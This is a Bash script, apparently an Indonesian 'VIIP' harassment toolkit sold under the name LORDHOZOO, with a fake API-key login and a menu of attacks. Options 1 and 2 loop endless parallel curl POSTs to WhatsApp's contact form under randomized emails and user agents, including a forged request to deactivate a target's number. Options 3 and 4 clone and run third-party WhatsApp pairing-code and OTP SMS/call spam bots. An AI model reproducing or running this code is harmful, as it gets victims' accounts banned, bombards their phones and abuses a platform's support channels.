clear
#/bin/lordhozoo
clear
pkg install nodejs -y 
clear 
apt install nodejs -y 
clear
npm i axios
clear
sudo apt install curl openssl
npm i colors
clear
npm i http 
clear
npm i form-data
clear
pkg install python  -y
clear
pkg install python2 -y
clear
pkg install pip-python -y
apt install python2 -y 
clear
apt install python3 -y 
clear
apt install sudo -y 
clear
apt install pip-python3
pip install time
pip install requests 
pip install colorama
pip install json 
pip install bs4
clear
pip3 install time
pip3 install requests 
pip3 install colorama
pip3 install json 
pip3 install bs4
clear

function show_loading() {
    local pid=$1
    local delay=0.1
    local spinstr='|/-\'
    local colors=("\e[31m" "\e[32m" "\e[33m" "\e[34m" "\e[35m" "\e[36m")
    echo -e "\e[1;37mMemverifikasi... \e[0m"
    
    while kill -0 "$pid" 2>/dev/null; do
        for i in "${!colors[@]}"; do
            local temp=${spinstr#?}
            local spinchar=${spinstr%"$temp"}
            local loading_bar="["
            
            for (( j=0; j<10; j++ )); do
                if [ $j -lt $i ]; then
                    loading_bar+="${colors[j]}■\e[0m"
                else
                    loading_bar+=" "
                fi
            done
            loading_bar+="]"
            
            echo -ne "\r${colors[i]}${spinchar}\e[0m $loading_bar"
            spinstr=$temp${spinstr%"$temp"}
            sleep "$delay"
        done
    done
    echo -ne "\r\e[K"
}

function login() {
    clear
    echo -e "\e[1;34m=== LOGIN ===\e[0m"
    local correct_user="hozoo"
    local correct_pass="hozoo"
    
    read -p "Username: " username
    echo -n "Password: "
    read -s password
    echo
    sleep 2 &
    show_loading $!
    if [ "$username" == "$correct_user" ] && [ "$password" == "$correct_pass" ]; then
        echo -e "\e[1;32mAPI KEY berhasil!\e[0m"
    else
        echo -e "\e[1;31mAPI KEY SALAH SILAKAN BELI API KEY LORDHOZOO\e[0m"
        sleep 2
        login
    fi
}
login
echo -e "\033[1;34m╔══════════════════════════════════╗\033[0m"
echo -e "\033[1;34m║  \033[1;33m[ \033[1;35mTOOLS VIIP LORDHOZOO SEWA     \033[1;33m]\033[1;34m ║\033[0m"
echo -e "\033[1;34m║  \033[1;33m AUTHOR \033[1;37m: \033[1;35mLORDHOZOO               \033[1;34m║\033[0m"
echo -e "\033[1;34m║  \033[1;32m ONLINE \033[1;37m: VIIP \033[1;35m                  \033[1;34m║\033[0m"
echo -e "\033[1;34m║ Sekarang jam $(date +"%H:%M:%S")                                \033[1;34m║\033[0m"
echo -e "\033[1;34m╚══════════════════════════════════╝\033[0m"
echo -e "\033[1;34m║\033[1;33m[ 01 ]\033[1;34m║\033[1;32m SPAM BOT BANNED WA    \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[1;33m[ 02 ]\033[1;34m║\033[1;32m SPAM BOT UNBANNED WA  \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[1;33m[ 03 ]\033[1;34m║\033[1;32m PAIRING ULIMITID      \033[1;34m║\033[0m"
echo -e "\033[1;34m║\033[1;33m[ 04 ]\033[1;34m║\033[1;32m SPAM OTP SMS CALL     \033[1;34m║\033[0m"
echo -e "\033[1;34m╚══════════════════════════════════╝\033[0m"
read -p "masukan nomor: " kuy
if [ $kuy = 1 ]
then
clear
clear
e="echo -e "
m="\033[1;31m"   
h="\033[1;32m"   
k="\033[1;33m"
b="\033[1;34m"
bl="\033[1;36m"  
p="\033[1;37m"
u="\033[1;35m"  
pu="\033[1;30m"
c="\033[1;96m"  
$e "$m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█ "
$e "$p █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█"
read -p " [+] Masukkan nomor target: " phone
clear
send_to_whatsapp_rapid() {
    local phone="$1"
    local count=0
    local max_threads=50  
    echo -e "\033[1;32m[+] Starting Unlimited Attack on: ${phone}\033[0m"
    echo -e "\033[1;33m[!] Press Ctrl+C to stop the attack\033[0m"
    while true; do
        local current_threads=$(jobs -r | wc -l)
        if [ $current_threads -lt $max_threads ]; then
            count=$((count + 1))
            local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
            local url="https://www.whatsapp.com/contact/?subject=messenger&lang=id&t=${RANDOM}${RANDOM}"
            local ajaxpipe_token="AXj$(openssl rand -hex 5)"
            local compat_iframe_token="AUU$(openssl rand -hex 8)"
            local waul="$(uuidgen | tr -d '-')"
            local rand_email="hozooimut${RANDOM}${RANDOM}@gmail.com"
            local post_data="Nomor Telepon=${phone}&Alamat Email=${rand_email}&Konfirmasikan Alamat Email=${rand_email}&Bagaimana Anda menggunakan WhatsApp=Android&Silakan masukkan pesan Anda di bawah=HELLO WHATSAPP DEVELOPER PLEASE RESTORE MY WHATSAPP ACCOUNT IMMEDIATELY, I USE WHATSAPP TO COMMUNICATE WITH IMPORTANT PEOPLE IN MY LIFE, WITHOUT THE WHATSAPP APP MY LIFE WILL BE PROBLEM, MY WHATSAPP ACCOUNT IS ${phone}&country=ID&phone_code=62&useTrustedTypes=false&isTrustedTypesReportOnly=false&ajaxpipe_token=${ajaxpipe_token}&compat_iframe_token=${compat_iframe_token}&isCQuick=false&brsid=7525697063073108760&waul=${waul}"
            local user_agents=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(shuf -i 100-120 -n 1).0.0.0 Safari/537.36"
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_$(shuf -i 12-16 -n 1)_$(shuf -i 0-9 -n 1)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/$(shuf -i 10-16 -n 1).$(shuf -i 0-5 -n 1) Safari/605.1.15"
                "Mozilla/5.0 (X11; Linux x86_64; rv:$(shuf -i 100-120 -n 1).0) Gecko/20100101 Firefox/$(shuf -i 100-120 -n 1).0"
                "Mozilla/5.0 (iPhone; CPU iPhone OS $(shuf -i 15-17 -n 1)_$(shuf -i 0-5 -n 1) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/$(shuf -i 10-16 -n 1).$(shuf -i 0-5 -n 1) Mobile/15E148 Safari/604.1"
            )
            local random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
            local curl_cmd="curl -s -X POST \"$url\""
            curl_cmd+=" -H \"Host: www.whatsapp.com\""
            curl_cmd+=" -H \"User-Agent: ${random_ua}\""
            curl_cmd+=" -H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\""
            curl_cmd+=" -H \"Accept-Language: id,en-US;q=0.7,en;q=0.3\""
            curl_cmd+=" -H \"Content-Type: application/x-www-form-urlencoded\""
            curl_cmd+=" -H \"Origin: https://www.whatsapp.com\""
            curl_cmd+=" -H \"Referer: https://www.whatsapp.com/contact/?subject=messenger&lang=id\""
            curl_cmd+=" -d \"$post_data\""
            eval "$curl_cmd" > /dev/null 2>&1 &
            echo -ne "\033[1;34m[${timestamp}] Requests sent: ${count} | Active threads: ${current_threads}\033[0m\r"
            local delay=$(( RANDOM % 2 + (current_threads * 10 / max_threads) ))
            sleep 0.${delay}
        else
            sleep 0.5
        fi
    done
}
send_to_whatsapp_rapid "$phone"
fi
if [ $kuy = 2 ]
then
clear
e="echo -e "
m="\033[1;31m"  
h="\033[1;32m"   
k="\033[1;33m"   
b="\033[1;34m"
bl="\033[1;36m" 
p="\033[1;37m"   
u="\033[1;35m"
pu="\033[1;30m"
c="\033[1;96m"  
$e "$m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█ "
$e "$p █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█"
read -p " [+] Masukkan nomor target: " phone

clear
send_to_whatsapp_rapid() {
    local phone="$1"
    local count=0
    local max_threads=50  
    echo -e "\033[1;32m[+] Starting Unlimited Attack on: ${phone}\033[0m"
    echo -e "\033[1;33m[!] Press Ctrl+C to stop the attack\033[0m"
    while true; do
        local current_threads=$(jobs -r | wc -l)
        
        if [ $current_threads -lt $max_threads ]; then
            count=$((count + 1))
            local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
            local url="https://www.whatsapp.com/contact/?subject=messenger&lang=id&t=${RANDOM}${RANDOM}"
            
            local ajaxpipe_token="AXj$(openssl rand -hex 5)"
            local compat_iframe_token="AUU$(openssl rand -hex 8)"
            local waul="$(uuidgen | tr -d '-')"
            local rand_email="hozooimut${RANDOM}${RANDOM}@gmail.com"
            local post_data="Nomor Telepon=${phone}&Alamat Email=${rand_email}&Konfirmasikan Alamat Email=${rand_email}&Bagaimana Anda menggunakan WhatsApp=Android&Silakan masukkan pesan Anda di bawah=Please deactivate this number: ${phone}&country=ID&phone_code=62&useTrustedTypes=false&isTrustedTypesReportOnly=false&ajaxpipe_token=${ajaxpipe_token}&compat_iframe_token=${compat_iframe_token}&isCQuick=false&brsid=7525697063073108760&waul=${waul}"
            local user_agents=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$(shuf -i 100-120 -n 1).0.0.0 Safari/537.36"
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_$(shuf -i 12-16 -n 1)_$(shuf -i 0-9 -n 1)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/$(shuf -i 10-16 -n 1).$(shuf -i 0-5 -n 1) Safari/605.1.15"
                "Mozilla/5.0 (X11; Linux x86_64; rv:$(shuf -i 100-120 -n 1).0) Gecko/20100101 Firefox/$(shuf -i 100-120 -n 1).0"
                "Mozilla/5.0 (iPhone; CPU iPhone OS $(shuf -i 15-17 -n 1)_$(shuf -i 0-5 -n 1) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/$(shuf -i 10-16 -n 1).$(shuf -i 0-5 -n 1) Mobile/15E148 Safari/604.1"
            )
            local random_ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
            local curl_cmd="curl -s -X POST \"$url\""
            curl_cmd+=" -H \"Host: www.whatsapp.com\""
            curl_cmd+=" -H \"User-Agent: ${random_ua}\""
            curl_cmd+=" -H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\""
            curl_cmd+=" -H \"Accept-Language: id,en-US;q=0.7,en;q=0.3\""
            curl_cmd+=" -H \"Content-Type: application/x-www-form-urlencoded\""
            curl_cmd+=" -H \"Origin: https://www.whatsapp.com\""
            curl_cmd+=" -H \"Referer: https://www.whatsapp.com/contact/?subject=messenger&lang=id\""
            curl_cmd+=" -d \"$post_data\""
            eval "$curl_cmd" > /dev/null 2>&1 &
            echo -ne "\033[1;34m[${timestamp}] Requests sent: ${count} | Active threads: ${current_threads}\033[0m\r"
            local delay=$(( RANDOM % 2 + (current_threads * 10 / max_threads) ))
            sleep 0.${delay}
        else
            sleep 0.5
        fi
    done
}
send_to_whatsapp_rapid "$phone"
fi
if [ $kuy = 3 ]
then
apt update && apt upgrade -y
apt install nodejs git -y
git clone https://github.com/ZeltNamizake/spcwa
cd spcwa
npm start
fi
if [ $kuy = 4 ]
then
git clone https://github.com/rickyfazaa/MySPAMBot-OTP
cd MySPAMBot-OTP 
python main.py
fi
